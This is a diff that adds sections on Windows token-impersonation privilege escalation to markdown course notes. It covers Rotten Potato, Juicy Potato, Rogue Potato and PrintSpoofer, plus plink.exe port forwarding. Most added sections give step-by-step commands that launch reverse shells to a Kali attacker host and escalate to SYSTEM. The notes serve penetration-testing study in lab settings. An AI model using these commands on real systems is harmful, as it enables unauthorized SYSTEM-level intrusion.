@@ -145,8 +145,14 @@ https://tryhackme.com/room/enumerationpe
 - [installed apps](#installed-apps)
 - [hot potato](#hot-potato)
 - [token impersonation](#token-impersonation)
-  - [2 Service Accounts](#2-Service-Accounts)
+  - [L Service Accounts](#2-Service-Accounts)
+  - [L Rotten Potato](#2-Rotten-Potato)
+  - [SeImpersonate and or SeAssignPrimaryToken](SeImpersonate-and-or-SeAssignPrimaryToken)
+  - [L + E Juicy Potato](#2-Juicy-Potato)
+  - [E Rogue Potato](#E-Rogue-Potato)
+  - [E PrintSpoofer](#E-PrintSpoofer)
 - [port forwarding](#port-forwarding)
+  - [plink.exe](#plink.exe)
 - [getsystem Named Pipes and Token Duplication](#getsystem-Named-Pipes-and-Token-Duplication)
 - [user privileges](#user-privileges)
 - [Privilege Escalation Strategy](#Privilege-Escalation-Strategy)
@@ -2870,7 +2876,7 @@ and their server counterparts.
 
 ### token impersonation
 
-#### 2 Service Accounts
+#### L Service Accounts
 We briefly talked about service accounts at the start of the
 course.
 Service accounts can be given special privileges in order for them
@@ -2879,17 +2885,126 @@ Unfortunately, multiple problems have been found with service
 accounts, making them easier to escalate privileges with.
 
 
+#### L Rotten Potato
+The original Rotten Potato exploit was identified in 2016.
+Service accounts could intercept a SYSTEM ticket and use it
+to impersonate the SYSTEM user.
+This was possible because service accounts usually have the
+“SeImpersonatePrivilege” privilege enabled.
 
+#### SeImpersonate and or SeAssignPrimaryToken
+Service accounts are generally configured with these two
+privileges.
+They allow the account to impersonate the access tokens of
+other users (including the SYSTEM user).
+Any user with these privileges can run the token
+impersonation exploits in this lecture.
 
+#### L + E Juicy Potato
+Rotten Potato was quite a limited exploit.
+Juicy Potato works in the same way as Rotten Potato,
+but the authors did extensive research and found many
+more ways to exploit.
+https://github.com/ohpe/juicy-potato
 
+#### Privilege Escalation example
 
+(Note: These steps are for Windows 7)
+1.Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to
+Windows.
+2.Start a listener on Kali.
+3.Using an administrator command prompt, use PSExec64.exe to trigger a
+reverse shell running as the Local Service service account:
+```
+> C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+```
+4.Start another listener on Kali.
+5.Now run the JuicyPotato exploit to trigger a reverse shell running with
+SYSTEM privileges:
+```
+> C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
+```
+
+6.If the CLSID ({03ca...) doesn’t work for you, either check this list:
+```
+https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+```
+or run the GetCLSID.ps1 PowerShell script.
+
+#### E Rogue Potato
+Latest of the “Potato” exploits.
+GitHub: https://github.com/antonioCoco/RoguePotato
+Blog: https://decoder.cloud/2020/05/11/no-more-
+juicypotato-old-story-welcome-roguepotato/
+Compiled Exploit:
+https://github.com/antonioCoco/RoguePotato/releases
+
+#### Privilege Escalation example
+
+1.Copy PSExec64.exe and the RoguePotato.exe exploit executable
+over to Windows.
+2.Set up a socat redirector on Kali, forwarding Kali port 135 to port
+9999 on Windows (192.168.1.22 is the Windows IP):
+```
+# sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.1.22:9999
+```
+3.Start a listener on Kali.
+
+4.Using an administrator command prompt, use PSExec64.exe to trigger a
+reverse shell running as the Local Service service account:
+```
+> C:\PrivEsc\PSExec64.exe /accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+```
+5.Start another listener on Kali.
+6.Now run the RoguePotato exploit to trigger a reverse shell running with
+SYSTEM privileges (192.168.1.11 is the Kali IP):
+```
+> C:\PrivEsc\RoguePotato.exe -r 192.168.1.11 –l 9999 -e "C:\PrivEsc\reverse.exe"
+```
+
+#### E PrintSpoofer
+PrintSpoofer is an exploit that targets the Print Spooler
+service.
+GitHub: https://github.com/itm4n/PrintSpoofer
+Blog: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
+
+#### Privilege Escalation example
+
+obs: this exploit requires that visual c++ distributable is installed so transfer and installed for example "vc_redist.x64.exe installer
+
+1.Copy PSExec64.exe and the PrintSpoofer.exe exploit executable
+over to Windows.
+2.Start a listener on Kali.
+3.Using an administrator command prompt, use PSExec64.exe to
+trigger a reverse shell running as the Local Service service account:
+```
+> C:\PrivEsc\PSExec64.exe /accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+```
+
+4. Start another listener on Kali.
+5. Now run the PrintSpoofer exploit to trigger a
+reverse shell running with SYSTEM privileges:
+```
+> C:\PrivEsc\PrintSpoofer.exe –i -c "C:\PrivEsc\reverse.exe"
+```
 
 ### port forwarding
 
+Sometimes it is easier to run exploit code on Kali, but the
+vulnerable program is listening on an internal port.
+In these cases we need to forward a port on Kali to the
+internal port on Windows.
+We can do this using a program called plink.exe (from the
+makers of PuTTY).
 
-
-
-
+#### plink.exe
+The general format of a port forwarding command using
+plink.exe:
+> plink.exe <user>@<kali> -R <kali-
+port>:<target-IP>:<target-port>
+Note that the <target-IP> is usually local (e.g. 127.0.0.1).
+plink.exe requires you to SSH to Kali, and then uses the SSH
+tunnel to forward ports.
 
 
 
